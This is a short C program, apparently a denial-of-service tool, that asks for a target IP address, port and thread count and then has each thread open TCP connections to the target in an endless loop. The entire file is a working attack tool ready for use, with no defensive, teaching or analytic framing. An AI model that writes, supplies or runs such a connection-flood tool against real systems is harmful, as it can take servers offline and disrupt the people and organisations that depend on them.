#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
char ip[20];
int threads;
int port;
   
void attack()
{
register int sock=0;
int valread;
struct sockaddr_in serv_addr;
while(1){
	if((sock=socket(AF_INET,SOCK_STREAM,0))<0)
		break;
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port=htons(port);
	if(inet_pton(AF_INET,ip,&serv_addr.sin_addr)<=0)
		break;
	connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
	}
}
int main()
{printf("ip:");
scanf("%s",ip);
printf("port:");
scanf("%d",&port);
printf("threads:");
scanf("%d",&threads);
puts("attack...");
pthread_t t[threads];
   for(size_t i=0;i<threads;i++)
	pthread_create(&t[i],NULL,(void *)attack,NULL);
sleep(10000);
return 0;
}
